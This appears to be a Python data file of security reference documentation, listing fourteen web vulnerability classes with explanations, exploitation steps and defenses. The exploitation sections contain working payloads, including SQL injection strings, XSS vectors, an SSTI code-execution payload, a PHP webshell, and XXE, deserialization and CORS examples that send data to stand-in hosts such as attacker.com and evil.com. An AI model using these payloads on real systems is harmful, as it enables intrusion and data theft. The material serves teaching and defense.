"""Detailed web vulnerability content for security reference documentation."""

WEB_CONTENT = {
    "web/sqli": {
        "how_it_works": """SQL injection occurs when application code concatenates untrusted input into SQL queries instead of using parameterized queries or a safe query builder. The database interpreter then executes attacker-controlled syntax as part of the query.

Common injection points include URL parameters (`?id=1`), POST body fields, HTTP headers used in lookups (cookies, `X-Forwarded-For`), and JSON/XML fields that are mapped to database queries. Vulnerabilities appear in login forms, search boxes, reporting filters, and hidden API parameters.

Injection types vary by context:

- **In-band (union-based)**: Results appear directly in the HTTP response.
- **Error-based**: Verbose SQL errors leak schema or data.
- **Boolean blind**: True/false conditions change page behavior without visible errors.
- **Time-based blind**: Delays (`SLEEP`, `WAITFOR DELAY`) confirm injection when no other oracle exists.
- **Stacked queries**: Multiple statements execute if the driver allows (`; DROP TABLE--`).

The root cause is treating structured query language as a string template. Escaping alone is fragile; parameter binding separates data from code at the protocol level.""",

        "exploitation": """**Reconnaissance and confirmation**

1. Probe with a single quote (`'`) and look for errors or behavior changes.
2. Test boolean pairs: `' AND 1=1--` vs `' AND 1=2--`.
3. Use time delays for blind cases: `'; WAITFOR DELAY '0:0:5'--` (SQL Server) or `' OR SLEEP(5)--` (MySQL).

**Union-based extraction**

Determine column count with `ORDER BY` or `UNION SELECT NULL,NULL,...`. Match data types per column, then extract:

```sql
' UNION SELECT username,password FROM users--
```

**Automation**

```bash
sqlmap -u "https://target.com/item?id=1" --batch --level=3
sqlmap -r request.txt --batch --dbs
```

**Attack flow**

```
User input → unsanitized string concat → DB executes attacker SQL → data leak / auth bypass / RCE (xp_cmdshell, INTO OUTFILE)
```

**High-impact paths**

- Authentication bypass: `' OR '1'='1'--`
- Read arbitrary tables via `UNION SELECT`
- Write webshells when `FILE` privilege exists (MySQL `INTO OUTFILE`)
- OS command execution on MSSQL with `xp_cmdshell` when enabled""",

        "defense": """**Primary fix**: Use parameterized queries (prepared statements) for every query path. In Java use `PreparedStatement`; in Python use bound parameters with DB-API drivers; in PHP prefer PDO with bound parameters—not `mysql_query` concatenation.

**Defense in depth**

- **Least privilege**: Application DB accounts should not have `FILE`, `xp_cmdshell`, or DDL rights.
- **Input validation**: Allow-lists for enums and numeric IDs; reject unexpected characters where binding is not used.
- **Error handling**: Return generic errors to clients; log details server-side only.
- **ORM discipline**: Avoid raw SQL fragments; audit `nativeQuery` and dynamic `WHERE` builders.
- **WAF**: Can block obvious payloads but is not a substitute for secure coding.

**Verification**

- Code review all database access layers.
- DAST/SAST plus manual testing on every input vector.
- Regression tests with malicious strings in CI for critical endpoints.""",
    },

    "web/xss": {
        "how_it_works": """Cross-Site Scripting (XSS) lets attackers inject JavaScript or HTML that executes in another user's browser under the victim site's origin. That origin access enables session theft, account takeover, keylogging, and actions on behalf of the victim.

**Reflected XSS**: Payload in the request is immediately echoed in the response (search results, error messages).

**Stored XSS**: Payload persists (comments, profile fields, tickets) and executes for every viewer.

**DOM-based XSS**: Client-side JavaScript reads from `location`, `document.cookie`, or storage and writes to dangerous sinks (`innerHTML`, `eval`, `document.write`) without server reflection.

Context matters for exploitation:

- **HTML body**: `<script>alert(1)</script>`
- **Attribute**: `" onmouseover=alert(1) x="`
- **JavaScript string**: `';alert(1)//`
- **URL context**: `javascript:alert(1)`

Filters, encoders, and Content Security Policy (CSP) interact with payload crafting. Modern apps often mix server templates with rich client frameworks, multiplying sink locations.""",

        "exploitation": """**Mapping**

1. Identify all inputs: forms, query params, WebSocket messages, postMessage handlers.
2. Locate sinks in client and server code (Burp, browser devtools, source review).
3. Determine output encoding and CSP headers.

**Proof-of-concept payloads**

```html
<script>alert(document.domain)</script>
"><img src=x onerror=alert(1)>
<svg onload=alert(1)>
```

**DOM XSS example**

Vulnerable pattern:

```javascript
document.getElementById('out').innerHTML = location.hash.slice(1);
```

Payload: `https://target.com/page#<img src=x onerror=alert(1)>`

**Impact demonstration (authorized testing)**

- Steal cookies where `HttpOnly` is absent (rare for session cookies today).
- Exfiltrate page content or tokens via `fetch` to attacker server.
- Perform CSRF-like actions with the victim's session from injected script.

**Automation**

```bash
dalfox url "https://target.com/search?q=test"
cat urls.txt | dalfox pipe -o xss_results.txt
```

**Bypass techniques**

- Case variation, tag breaking (`<scr<script>ipt>`), event handlers (`onfocus`), encoding (HTML entities, Unicode), and CSP gadget chains when policies are weak.""",

        "defense": """**Output encoding** by context: HTML entity encode for HTML body, JavaScript encode for JS strings, URL encode for URLs. Never insert raw user data into HTML templates.

**CSP**: Deploy a strict policy (`default-src 'self'`) with nonces or hashes for required inline script. Avoid `unsafe-inline` and broad `unsafe-eval`.

**Framework defaults**: Use React/Vue text bindings (`{{ }}`) rather than raw HTML (`v-html`, `dangerouslySetInnerHTML`) unless content is strictly sanitized.

**Cookies**: `HttpOnly`, `Secure`, `SameSite=Lax` or `Strict` on session cookies.

**DOM hygiene**: Avoid `innerHTML` with untrusted data; use `textContent`. Validate `postMessage` origin. Sanitize with a maintained library (DOMPurify) when HTML is required.

**Testing**: Regular XSS scans plus manual review of every reflection point and client-side sink.""",
    },

    "web/ssrf": {
        "how_it_works": """Server-Side Request Forgery (SSRF) abuses server-side functionality that fetches or connects to URLs supplied by users. The attacker's goal is to make the **server** request resources the attacker cannot reach directly—internal services, cloud metadata endpoints, or restricted admin interfaces.

Typical features at risk:

- Image/document import from URL
- Webhook URL configuration
- PDF generators fetching HTML
- Link preview/unfurl
- SSO or OIDC discovery URL fetch
- Server-side crawlers and health checks

Cloud metadata is a classic target:

- AWS: `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
- GCP/Azure: similar link-local metadata services

The server often sits inside a trust boundary with access to internal APIs (`http://127.0.0.1:8080/admin`), Redis, Elasticsearch, or Kubernetes API—none of which should be exposed to the internet.""",

        "exploitation": """**Discovery**

1. Find parameters accepting URLs: `url`, `src`, `redirect`, `callback`, `feed`, `path`.
2. Submit `http://your-collaborator.burpcollaborator.net` and observe DNS/HTTP callbacks.
3. Probe internal hosts: `http://127.0.0.1`, `http://10.0.0.1`, `http://192.168.1.1`.

**Bypass filters**

- Alternative IP representations: `2130706433` (decimal), `0x7f000001`, `127.1`
- DNS rebinding: domain resolves to public IP first, then internal
- Redirect chains: attacker URL redirects to `http://169.254.169.254/`
- URL schemes: `file:///etc/passwd`, `gopher://`, `dict://` (when supported)

**Attack flow**

```
Attacker supplies URL → server fetches it → internal/metadata response returned or used server-side → credential theft / port scan / RCE via internal admin
```

**Cloud credential theft**

```bash
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
```

**Escalation**

- Scan internal ports via response timing or error messages
- Hit Redis `http://127.0.0.1:6379` with crafted paths (protocol smuggling contexts)
- Chain with XXE or deserialization on internal services only reachable from the app server""",

        "defense": """**Network controls**

- Deny egress from application servers to link-local and internal ranges except explicitly required destinations.
- Use metadata service v2 (IMDSv2 on AWS) requiring session tokens and hop limits.

**Application controls**

- Allow-list destinations (specific partner domains) instead of block-lists.
- Resolve hostnames and validate resolved IP is not private/link-local before connecting.
- Disable redirects or re-validate each hop in a redirect chain.
- Strip or ignore dangerous URL schemes; use `https` only where possible.

**Architecture**

- Separate fetch workers in isolated network segments with no cloud metadata access.
- Do not return raw internal responses to users; summarize or proxy through strict parsers.

**Monitoring**

- Alert on requests to metadata IPs, `localhost`, and RFC1918 ranges from app tiers.""",
    },

    "web/idor": {
        "how_it_works": """Insecure Direct Object Reference (IDOR) is an access control failure where the application exposes object identifiers (IDs, filenames, tokens) in requests but fails to verify that the authenticated user is authorized to access the referenced object.

Examples:

- `GET /api/orders/12345` returns any order when IDs are swapped
- `GET /files/report_2024.pdf?user_id=2` exposes another user's file
- GraphQL node IDs or UUIDs that are predictable or leaked elsewhere

IDOR differs from missing authentication: the user is logged in but accesses objects outside their tenancy, role, or ownership. Identifiers may be sequential integers, UUIDs, hashed values, or encoded strings (`base64(userId:docId)`).

Root causes:

- Authorization checked only at menu/UI level, not per API call
- Relying on obscurity of UUIDs instead of server-side policy
- Mass assignment updating fields the user should not control alongside ID swaps""",

        "exploitation": """**Methodology**

1. Create two accounts: low-privilege (attacker) and victim (or second low account).
2. Capture object IDs from legitimate traffic for each account.
3. Replay victim object IDs with attacker session tokens.
4. Test HTTP methods: GET, PUT, PATCH, DELETE.

**Techniques**

- Increment/decrement numeric IDs: `/invoice/1001` → `/invoice/1002`
- Swap UUIDs discovered in JS bundles, emails, or public listings
- Decode encoded IDs: `base64`, JWT payload fields
- Change parent scope: `accountId=100` → `accountId=101`
- Test batch endpoints that accept arrays of IDs

**Attack flow**

```
Attacker authenticates → requests object by ID → server fetches by ID only → no ownership check → unauthorized data returned
```

**Tools**

- Burp Autorize: compare responses across roles automatically
- Custom scripts iterating ID ranges (respect scope and rate limits)

**Impact**

- PII exposure (health records, invoices, messages)
- Account modification (email change, password reset tokens)
- Financial fraud (transfer endpoints with weak checks)""",

        "defense": """**Authorize every request**: After authentication, enforce object-level authorization—"Does this user own or have permission for this `orderId`?" Use central policy services or consistent middleware, not ad hoc checks in scattered controllers.

**Design patterns**

- Use non-guessable IDs (UUIDv4) **plus** authorization—not UUIDs alone.
- Prefer indirect references: session-scoped maps from opaque tokens to internal IDs.
- Scope queries: `SELECT * FROM orders WHERE id = ? AND user_id = ?` in the same query.

**API hygiene**

- Avoid exposing internal sequential IDs in URLs when possible.
- Validate tenant/account context on every nested resource (`/orgs/{orgId}/projects/{projectId}`).
- Log and alert on cross-tenant access attempts.

**Testing**

- Role matrix testing in CI: each endpoint tested with wrong user's object IDs must return 403/404 consistently.""",
    },

    "web/ssti": {
        "how_it_works": """Server-Side Template Injection occurs when user input is embedded into a server-side template engine and interpreted as template syntax rather than static text. Unlike XSS (browser), SSTI executes on the server—often leading to remote code execution.

Common engines:

- **Jinja2** (Python/Flask)
- **Twig** (PHP)
- **Freemarker/Velocity** (Java)
- **ERB** (Ruby)
- **Handlebars** (Node, when server-rendered)

Vulnerability arises when applications use templates for dynamic emails, error pages, or "customizable" user dashboards and pass raw user input into `render()` or equivalent:

```python
template = f"Hello {user_input}"  # dangerous if user_input contains {{ }}
return render_template_string(template)
```

Detection often starts with polyglot probes like `{{7*7}}` returning `49` in the response.""",

        "exploitation": """**Detection**

```
{{7*7}}
${7*7}
<%= 7*7 %>
#{7*7}
```

Different engines respond differently; identify engine from behavior and error messages.

**Jinja2 RCE example (lab/authorized)**

```python
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
```

**Attack flow**

```
User input in template → engine evaluates expressions → file read / command execution on app server
```

**Blind SSTI**

When output is not reflected, use time-based payloads or out-of-band callbacks:

```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('curl attacker.com').read() }}
```

**Tools**

```bash
tplmap -u 'https://target.com/page?name=test'
```

**Escalation paths**

- Read config files and cloud credentials
- Reverse shell from app container
- Pivot to internal network from compromised app tier""",

        "defense": """**Never render user input as template source**. Pass user data only as template **context variables** with fixed templates stored on disk.

**Sandboxing**

- Use engine sandbox modes where available; understand limitations—many "sandboxes" are bypassable.
- Prefer logic-less templates or static generation for user-customizable content.

**Input handling**

- Strict allow-lists for user-controlled display fields.
- Separate admin-only template editing behind strong authorization and audit.

**Detection**

- Scan with template polyglots in QA.
- Code review for `render_template_string`, `eval`, dynamic `Template()` constructors.

**Incident response**

- SSTI RCE equals full application compromise—rotate secrets, rebuild containers, review lateral movement.""",
    },

    "web/lfi-rfi": {
        "how_it_works": """Local File Inclusion (LFI) and Remote File Inclusion (RFI) arise when applications include or read files based on user-controlled paths without strict validation.

**LFI**: Attacker includes files on the server filesystem—configuration files, source code, logs, `/etc/passwd`—via path traversal:

```
?page=../../../etc/passwd
?page=....//....//etc/passwd
```

**RFI**: Attacker supplies a remote URL so the server fetches and executes attacker-controlled code (common in legacy PHP `include($_GET['page'])`):

```
?page=http://evil.com/shell.txt
```

PHP wrappers extend LFI impact:

- `php://filter/convert.base64-encode/resource=index.php` (source disclosure)
- `php://input` with POST body (code execution in some configs)
- `expect://id` when `expect` wrapper enabled

Log poisoning and `/proc/self/environ` techniques turn LFI into RCE by injecting PHP into access logs then including the log file.""",

        "exploitation": """**LFI enumeration**

1. Identify parameters: `file`, `page`, `template`, `lang`, `document`.
2. Test traversal: `../../../../etc/passwd`, encoded variants (`%2e%2e%2f`).
3. Null byte `%00` on legacy PHP versions to truncate extensions: `shell.php%00`.

**PHP source extraction**

```
php://filter/convert.base64-encode/resource=../config.php
```

**RFI proof**

Host a text file on your server:

```php
<?php system($_GET['cmd']); ?>
```

Request: `?page=http://attacker.com/shell.txt`

**Log poisoning flow**

1. Poison Apache/Nginx log with PHP in User-Agent or request path.
2. Include log path: `/var/log/apache2/access.log` via LFI.
3. Execute commands via appended query parameters.

**Attack flow**

```
Path parameter → include()/read() → arbitrary local file or remote URL → info leak → RCE
```""",

        "defense": """**Eliminate user-controlled file paths**. Map allowed pages to an allow-list:

```python
PAGES = {"home": "home.php", "about": "about.php"}
include(PAGES.get(page, "home.php"))
```

**Path canonicalization**

- Resolve paths with `realpath()` and verify result stays within intended directory.
- Reject `..`, absolute paths, and URL schemes (`http://`, `php://`).

**Configuration**

- Disable `allow_url_include` in PHP.
- Run apps with read-only filesystem where possible; no write access to web logs from untrusted input.

**WAF/rules**: Block traversal sequences as secondary control only.

**Monitoring**: Alert on repeated `%2e%2e` patterns and wrapper scheme usage in parameters.""",
    },

    "web/xxe": {
        "how_it_works": """XML External Entity (XXE) attacks abuse XML parsers that process external entity declarations. When a parser resolves external entities, attacker-defined URIs can read local files, perform SSRF, or cause denial of service.

Classic payload structure:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
```

**Blind XXE** uses out-of-band (OOB) callbacks:

```xml
<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
%xxe;
```

DTD declares entities that exfiltrate file content via HTTP.

Affected inputs: SOAP APIs, SAML assertions, Office document uploads, SVG, RSS, legacy config import features, and any endpoint accepting XML without hardened parser settings.

Java (`DocumentBuilder`), .NET (`XmlReader` before secure defaults), and PHP (`DOMDocument`) are risky when external entities are enabled.""",

        "exploitation": """**In-band file read**

Post XML with `SYSTEM "file:///etc/passwd"` entity referenced in a response field.

**SSRF via XXE**

```xml
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
```

**Blind exfiltration**

Attacker hosts `evil.dtd`:

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?d=%file;'>">
%eval;
%exfil;
```

**Attack flow**

```
XML body with malicious DTD → parser resolves external entity → file/SSRF/OOB leak
```

**Tools**

- Burp Collaborator for OOB detection
- `xxeinjector`, custom Python with `lxml` for testing parser configs

**Denial of service**

Billion laughs / quadratic blowup entity expansion can crash parsers lacking limits.""",

        "defense": """**Disable external entities** in every XML parser:

- Java: `factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true)` and disable DTDs.
- .NET: `XmlReaderSettings { DtdProcessing = DtdProcessing.Prohibit }`.
- libxml2: `XML_PARSE_NOENT` must not be combined with network access.

**Prefer JSON** for modern APIs unless XML is required.

**Input validation**

- Reject DOCTYPE declarations at the byte level if feasible.
- Use whitelisted schemas without custom DTD processing.

**Network**

- Block egress from parsers to metadata and internal IPs.

**Library updates**

- Keep parser libraries patched; defaults vary by version.""",
    },

    "web/deserialization": {
        "how_it_works": """Insecure deserialization restores attacker-controlled byte streams or text into runtime objects. If the application trusts serialized data from cookies, hidden fields, message queues, or APIs, gadget chains in the language runtime can lead to arbitrary code execution.

**Java**: `ObjectInputStream.readObject()` with commons-collections gadgets (ysoserial).

**PHP**: `unserialize()` on user cookies enabling property-oriented programming.

**.NET**: `BinaryFormatter`, `Json.NET TypeNameHandling.All`.

**Python**: `pickle.loads()` is never safe on untrusted input.

The vulnerability is not merely parsing JSON—it's **type resurrection** and **gadget invocation** where magic methods (`__reduce__`, `readObject`) chain into dangerous sinks (exec, file write, JNDI lookup).

Serialized blobs often appear Base64-encoded in cookies (`rO0AB...` Java, `O:8:"stdClass"` PHP).""",

        "exploitation": """**Identification**

1. Capture cookies, POST bodies, and WebSocket messages with magic signatures.
2. Decode Base64 and inspect for Java serialization headers (`ac ed 00 05`), PHP `O:` prefixes.

**Java gadget generation**

```bash
ysoserial.jar CommonsCollections6 'curl attacker.com/pwned' | base64
```

Replace session cookie or API field with malicious payload; trigger deserialization on next request.

**PHP example**

Manipulate object properties in serialized session to change `role` from `user` to `admin` when app compares object fields without re-validation.

**Attack flow**

```
Tampered serialized object → server deserializes → gadget chain executes → RCE or privilege escalation
```

**Blind cases**

- Out-of-band DNS/HTTP from JNDI injection chains (Log4Shell class of issues)
- Time-delay gadgets for confirmation

**Tools**: ysoserial, phpggc, Burp Java Deserialization Scanner""",

        "defense": """**Do not deserialize untrusted data**. Use JSON with schema validation and plain data types—never pick `TypeNameHandling.All` or Java polymorphic default typing without safeguards.

**Hardening when serialization is required**

- Java: `ObjectInputFilter`, allow-list classes, avoid dangerous libraries on classpath.
- .NET: Replace `BinaryFormatter`; use `System.Text.Json` without type names.
- Python: Never `pickle` from users; use JSON/msgpack with validation.

**Integrity**

- Sign encrypted tokens (HMAC) so tampering is detected before parse.
- Short-lived session blobs stored server-side instead of client-side serialized state.

**Dependency hygiene**

- Remove unused gadget libraries (commons-collections old versions).
- Monitor for known CVEs in serialization stacks.

**Detection**

- WAF rules for Java serialization magic bytes in cookies.
- EDR alerts on child processes spawned from app servers after cookie updates.""",
    },

    "web/race-condition": {
        "how_it_works": """Race conditions in web applications exploit the gap between **checking** a condition and **using** the result (time-of-check to time-of-use, TOCTOU). Parallel requests can pass a limit check simultaneously before any request completes the state update.

Classic web examples:

- Double-spend: two parallel transfers when balance covers only one
- Coupon reuse: same discount code applied concurrently
- Vote or like limits bypassed
- Account creation with single-use invitation tokens
- File upload race: swap file after path check

Single-threaded request handling does not eliminate races when multiple app instances, async workers, or database transactions with weak isolation interact.

Microsecond-level windows matter: attackers send dozens of simultaneous HTTP/2 or TCP connections with Burp Turbo Intruder or custom asyncio scripts.""",

        "exploitation": """**Identify targets**

1. Operations with limits: balance, inventory, rate limits, one-time tokens.
2. Multi-step flows where step 2 assumes step 1 state unchanged.
3. File operations: upload then execute, move then read.

**Parallel request technique**

Send 20–100 identical POSTs in the same millisecond:

```python
import asyncio, aiohttp

async def post(session):
    await session.post("https://target.com/apply-coupon", data={"code": "SAVE50"})

async def main():
    async with aiohttp.ClientSession() as s:
        await asyncio.gather(*[post(s) for _ in range(50)])

asyncio.run(main())
```

**Attack flow**

```
Request A and B read balance=100 → both pass check for 100 debit → both commit → balance=-100 or double payout
```

**Last-byte synchronization**

- Align requests with `Connection: close` bursts
- HTTP/2 single-connection multiplexing for tighter timing
- Turbo Intruder `race` mode with gate release

**Indicators**

- Inconsistent final state vs expected single-operation outcome
- Multiple success responses where only one should succeed""",

        "defense": """**Atomic operations**

- Use database constraints: `CHECK (balance >= 0)`, unique indexes on coupon usage per user.
- Single atomic SQL: `UPDATE accounts SET balance = balance - 100 WHERE id = 1 AND balance >= 100`.

**Transactions and locking**

- `SELECT ... FOR UPDATE` in transactions for financial operations.
- Distributed locks (Redis Redlock) for cross-instance critical sections—use carefully with fencing tokens.

**Idempotency**

- Idempotency keys on payment APIs; server stores processed key set.
- One-time tokens consumed atomically with compare-and-swap.

**Design**

- Avoid check-then-act in application memory; push rules to DB or transactional message queues.

**Testing**

- Load tests with deliberate parallelism in staging.
- Property-based tests asserting invariant (balance never negative).""",
    },

    "web/open-redirect": {
        "how_it_works": """Open redirects occur when an application redirects users to arbitrary URLs based on unvalidated query parameters (`url`, `next`, `return`, `redirect`, `r`). The browser trusts the initial domain in the link, but the user ends up on an attacker-controlled site.

Impact extends beyond phishing:

- **OAuth/OIDC token theft**: `redirect_uri` or post-login redirect chains leak tokens to attacker pages
- **SSRF filter bypass**: some parsers allow redirects to internal URLs after passing an allow-list check on the first hop
- **JavaScript execution** on some mobile WebViews with `intent://` or `javascript:` schemes (context-dependent)

Bypass techniques exploit URL parser differences:

- `//evil.com` (scheme-relative)
- `https://target.com.evil.com`
- `@evil.com` in URL userinfo
- Encoded slashes and Unicode homoglyphs
- Backslash handling: `https://target.com@evil.com` (parser-dependent)""",

        "exploitation": """**Discovery**

1. Crawl for redirect parameters in login, logout, OAuth, email links.
2. Replace value with `https://evil.com` and observe 302 `Location` header.

**Phishing POC**

```
https://bank.com/login?next=https://evil.com/fake-login
```

Email presents legitimate `bank.com` hostname; victim lands on credential harvester after redirect.

**OAuth chain**

Weak redirect validation plus `response_mode` or open redirect on partner site steals `access_token` from fragment.

**Attack flow**

```
User clicks trusted link → app returns 302 to attacker URL → victim trusts phishing page / token leaked
```

**Tools**

- OpenRedireX, manual Burp testing
- Fuzz common parameter names across archived URLs (gau, waybackurls)

**Validation bypass checklist**

Test `//`, encoded slashes (`%2f%2f`), tab/newline before hostname, subdomain tricks, and allow-list bypass via registered domain `eviltarget.com`.""",

        "defense": """**Avoid URL redirects from user input** when possible; use server-side route names mapped internally.

**Allow-list validation**

- Parse URL with a robust library; compare host to fixed allow-list of partner domains.
- Reject scheme-relative and non-https URLs in production.

**Relative paths only**

- Accept only paths starting with `/` that do not start with `//`:
  - Validate: `path.startsWith('/') && !path.startsWith('//')`

**OAuth**

- Strict `redirect_uri` exact match per client registration (no wildcards).

**User experience**

- Interstitial warning page for any external redirect with clear destination display.

**Monitoring**

- Log redirect targets; alert on external domains in redirect parameters.""",
    },

    "web/prototype-pollution": {
        "how_it_works": """Prototype pollution is a JavaScript vulnerability where attackers modify `Object.prototype` (or other builtins) by injecting properties through unsafe object merge, extend, or clone operations.

Typical vulnerable pattern:

```javascript
function merge(target, source) {
  for (let key in source) {
    target[key] = source[key];
  }
}
```

Payload via query string or JSON:

```json
{"__proto__": {"polluted": true}}
```

or

```json
{"constructor": {"prototype": {"polluted": true}}}
```

After pollution, `{}.polluted` is true because new objects inherit the poisoned prototype.

**Client-side**: Gadgets in libraries read from `obj.polluted` options → XSS.

**Server-side (Node.js)**: Pollution affects template engines, authorization checks, or `child_process` options → RCE in severe cases.""",

        "exploitation": """**Client-side**

1. Find `lodash.merge`, `jQuery.extend`, or custom deep merge on `location.hash` or JSON configs.
2. Pollute: `?__proto__[test]=polluted` or JSON `__proto__` key.
3. Chain gadgets: if app checks `if (obj.isAdmin)` and `isAdmin` can be set on prototype, bypass auth UI.

**Server-side Node**

```json
{"__proto__": {"shell": "node", "NODE_OPTIONS": "--require /proc/self/environ"}}
```

When polluted properties flow into `child_process.spawn` options or template engines.

**Attack flow**

```
Malicious key in merge → prototype polluted → later object access reads attacker property → XSS / RCE / auth bypass
```

**Tools**

- ppmap for gadget research
- Burp to fuzz JSON bodies with `__proto__`, `constructor.prototype`

**Detection**

- After payload, evaluate `({}).polluted` in console or check behavior changes globally.""",

        "defense": """**Safe merging**

- Use `Object.create(null)` for dictionaries without prototype chain.
- Freeze `Object.prototype` in hardened environments (`Object.freeze(Object.prototype)`).
- Libraries: upgrade lodash (CVE fixes), use `structuredClone` or safe merge utilities that block `__proto__`, `constructor`, `prototype`.

**Input validation**

- Reject keys matching `__proto__`, `constructor`, `prototype` in JSON parsers for untrusted input.
- JSON schema validation with additional property restrictions.

**Server-side Node**

- Avoid recursive merge on request bodies; validate schema explicitly.
- Run with least privilege; isolate workers.

**Dependencies**

- Audit client bundles for vulnerable merge helpers; pin patched versions.""",
    },

    "web/cors": {
        "how_it_works": """Cross-Origin Resource Sharing (CORS) controls whether browsers allow JavaScript on one origin to read responses from another. Misconfigurations let attacker.com's pages fetch sensitive APIs **with the victim's cookies** and read the result—bypassing same-origin policy for data exfiltration.

Critical headers:

- `Access-Control-Allow-Origin` (ACAO)
- `Access-Control-Allow-Credentials: true` (ACAC)

**Dangerous patterns**

- `ACAO: *` with credentials (browsers block, but mistakes abound)
- Reflecting arbitrary `Origin` header: `ACAO: https://evil.com` when request sends `Origin: https://evil.com`
- Weak prefix/suffix checks: `evil.com` matches `notevil.com` or subdomain tricks
- `ACAO: null` with credentials (sandboxed iframe origins)

Safe CORS is not needed for most same-site APIs; misconfiguration often arises from "fixing" CORS errors during development by allowing all origins.""",

        "exploitation": """**Recon**

1. Identify sensitive JSON endpoints (profile, tokens, admin APIs).
2. Send request with `Origin: https://evil.com` in Burp Repeater.
3. Check if response includes `Access-Control-Allow-Origin: https://evil.com` and `Access-Control-Allow-Credentials: true`.

**Exploit page on attacker server**

```html
<script>
fetch('https://target.com/api/me', {
  credentials: 'include'
}).then(r => r.text()).then(data => {
  fetch('https://evil.com/log?d=' + encodeURIComponent(data));
});
</script>
```

Victim visits attacker page while logged into target; browser sends session cookie; attacker's JS reads response.

**Attack flow**

```
Victim browser → attacker JS cross-origin fetch with cookies → misconfigured CORS reflects Origin → response readable → data exfiltrated
```

**Tools**

- CORScanner, corsy for bulk detection
- Burp CORS scan checks

**Null origin**

Craft sandboxed iframe or `data:` documents that send `Origin: null`.""",

        "defense": """**Default deny**

- Do not reflect `Origin` blindly. Use static allow-list of trusted front-end origins.

**Credentials**

- If `ACAC: true`, ACAO must be explicit origin—never `*`.
- Reject `null` origin unless explicitly required and audited.

**Sensitive endpoints**

- Require authentication tokens in headers (not cookie-only) for high-risk APIs; use `SameSite` cookies.
- CSRF tokens even for CORS-protected JSON when cookies authenticate.

**Review**

- Audit all API gateways and microservices for CORS middleware defaults.
- Separate public APIs from cookie-authenticated internal APIs on different hostnames with strict policies.

**Testing**

- Automated CORS misconfiguration scans in CI for staging environments.""",
    },

    "web/clickjacking": {
        "how_it_works": """Clickjacking (UI redressing) tricks users into clicking hidden or overlaid elements on a victim site while believing they interact with the attacker's visible UI. The attack typically embeds the target in a transparent `<iframe>` over decoy buttons.

Requirements for exploitation:

- Target page lacks frame-busting or proper `X-Frame-Options` / CSP `frame-ancestors`
- Victim is authenticated
- Click performs a sensitive action without re-authentication (one-click purchase, follow, disable security, grant OAuth)

Variants:

- **Classic overlay**: opacity-0 iframe over "Win iPad" button
- **Double clickjacking**: rapid iframe repositioning on mouse down
- **Likejacking**: hidden Facebook like iframe (legacy social widgets)

Mobile WebViews and hybrid apps may omit frame protections entirely.""",

        "exploitation": """**Verify framing**

```html
<iframe src="https://target.com/account/delete" style="opacity:0; position:absolute; top:0; left:0; width:100%; height:100%;">
</iframe>
<button style="position:relative; z-index:-1;">Click for prize</button>
```

If target loads in iframe, check if sensitive action is one click away.

**Attack flow**

```
Attacker page loads victim in iframe → user clicks visible decoy → click passes to iframe → unintended action on victim session
```

**High-value targets**

- "Delete account", "Add payee", "Grant admin", OAuth consent, security setting toggles
- CSRF-token-free JSON endpoints rarely help if action is pure GET link

**Bypass legacy frame busters**

- HTML5 sandbox attributes without `allow-top-navigation`
- Double framing, `onbeforeunload` race techniques (historical)

**Proof for reports**

- Screen recording of POC with test account
- Document missing `frame-ancestors` and successful framed sensitive page""",

        "defense": """**Frame denial headers**

```
X-Frame-Options: DENY
# or SAMEORIGIN when same-site embedding needed

Content-Security-Policy: frame-ancestors 'self'
```

CSP `frame-ancestors` supersedes XFO in modern browsers—deploy both for legacy coverage.

**Sensitive actions**

- Require re-authentication (password, MFA) for destructive operations.
- Nonces on state-changing requests; avoid sensitive GET links.

**OAuth**

- Use explicit consent screens that cannot be framed.

**Testing**

- Attempt to iframe every authenticated page in QA automation.
- Mobile app WebViews: set equivalent policies.

**User education**

- Secondary channel confirmation for financial transactions (out-of-band).""",
    },

    "web/http-request-smuggling": {
        "how_it_works": """HTTP request smuggling exploits disagreements between front-end (CDN, load balancer, WAF) and back-end (app server) on message boundaries. Attackers craft ambiguous requests so each parser splits headers/body differently—desynchronizing the connection queue.

Classic variants:

- **CL.TE**: Front-end uses `Content-Length`, back-end uses `Transfer-Encoding: chunked`
- **TE.CL**: Opposite priority
- **TE.TE**: Obfuscated `Transfer-Encoding` headers confuse one parser

When desync occurs, leftover bytes prefix the **next** user's request on a reused connection—hijacking victims' requests or poisoning caches.

HTTP/2 downgrades and HTTP/2-specific smuggling (H2.CL, H2.TE) extend the class to modern stacks when H2 is translated to H1 behind the edge.""",

        "exploitation": """**Detection (timing)**

Send ambiguous CL/TE requests; observe delays or error patterns vs baseline. Burp HTTP Request Smuggler automates probe templates.

**CL.TE smuggle skeleton**

```
POST / HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked

0

GPOST /admin HTTP/1.1
Host: target.com
...
```

Front-end forwards one request; back-end reads smuggled prefix as next request start.

**Attack flow**

```
Smuggled bytes on keep-alive connection → prepended to victim request → cache poison / credential hijack / bypass front-end ACL
```

**Impact chains**

- Force victims to hit attacker-controlled URLs (cache or redirect poisoning)
- Access internal admin paths only front-end should block
- Reflect victim headers to attacker via smuggled log endpoints

**Tools**

- Burp Smuggler, `smuggler.py`, `h2csmuggler` for H2 contexts

**Requirements**

- HTTP/1.1 keep-alive between tiers
- Parser differential confirmed—not theoretical on target architecture""",

        "defense": """**Normalize HTTP at edge**

- Re-encode requests at CDN/WAF; terminate ambiguous `Transfer-Encoding`.
- Disable HTTP/2 downgrade unless strictly validated.
- Prefer HTTP/2 end-to-end with strict RFC compliance.

**Back-end hardening**

- Reject requests with both CL and TE.
- Close connections after anomalous parsing instead of recovering.
- Use distinct connection pools; limit keep-alive for untrusted paths.

**Architecture**

- Isolate admin interfaces on separate hostnames without shared front-end connection reuse with public traffic.

**Detection**

- Monitor for malformed TE headers, duplicate Content-Length, abnormal chunk sequences.
- Vendor patches: keep proxies (nginx, Apache, IIS, HAProxy, Cloudflare) updated—many smuggling variants are version-specific.""",
    },

